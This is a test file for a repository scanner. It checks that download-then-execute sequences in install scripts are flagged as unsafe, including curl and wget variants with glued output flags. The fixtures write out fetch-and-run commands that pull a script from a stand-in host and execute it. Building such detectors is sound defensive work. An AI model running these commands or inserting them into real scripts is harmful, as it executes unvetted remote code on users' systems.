import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

const enc = (text: string) => new TextEncoder().encode(text);

function categories(text: string): string[] {
  return inspectRepository({
    files: [{ path: "install.sh", bytes: enc(text) }],
  }).findings.map((finding) => finding.category);
}

/**
 * The output flag of a download may carry the path glued to a cluster
 * (`-fsSLo path`, `-qO path`). The staged-execution rule required a standalone
 * `-o`/`-O`, so the whole two-step act went clean while the spaced spelling
 * right beside it fired.
 */
test("a path glued to a clustered output flag is the same staged execution", () => {
  for (const text of [
    "#!/bin/sh\ncurl -fsSLo /tmp/i.sh https://x.example/i.sh\nsh /tmp/i.sh\n",
    "#!/bin/sh\ncurl -sSLo /tmp/i.sh https://x.example/i.sh\nbash /tmp/i.sh\n",
    "#!/bin/sh\nwget -qO /tmp/b https://x.example/b\nsh /tmp/b\n",
    "#!/bin/sh\nwget -qO- /dev/null\nwget -qO /tmp/b https://x.example/b\nsh /tmp/b\n",
    // curl accepts the path glued to the output letter; verified against the
    // real client, which wrote 577 bytes and exited 0.
    "#!/bin/sh\ncurl -fsSLo/tmp/i.sh https://x.example/i.sh\nsh /tmp/i.sh\n",
    "#!/bin/sh\ncurl -sSLo/tmp/i.sh https://x.example/i.sh\n. /tmp/i.sh\n",
    '#!/bin/sh\ncurl -fsSLo"/tmp/i.sh" https://x.example/i.sh\nbash /tmp/i.sh\n',
  ])
    expect({ text, categories: categories(text) }).toEqual({
      text,
      categories: expect.arrayContaining(["unsafe-execution"]),
    });
});

test("the spaced spelling and the long flag still fire", () => {
  for (const text of [
    "#!/bin/sh\ncurl -fsSL -o /tmp/i.sh https://x.example/i.sh\nsh /tmp/i.sh\n",
    "#!/bin/sh\ncurl --output=/tmp/i.sh https://x.example/i.sh\nsh /tmp/i.sh\n",
    "#!/bin/sh\nwget --output-document=/tmp/b https://x.example/b\nsh /tmp/b\n",
  ])
    expect({ text, categories: categories(text) }).toEqual({
      text,
      categories: expect.arrayContaining(["unsafe-execution"]),
    });
});

test("wget -o still names the log and curl -O still names no path", () => {
  for (const text of [
    // `wget -o` writes a log; the download lands elsewhere, so no link.
    "#!/bin/sh\nwget -o /tmp/log https://x.example/b\nsh /tmp/log\n",
    // `curl -O` takes the name from the URL, so no literal path is captured.
    "#!/bin/sh\ncurl -fsSLO https://x.example/i.sh\nsh /tmp/i.sh\n",
  ])
    expect({ text, categories: categories(text) }).toEqual({
      text,
      categories: [],
    });
});
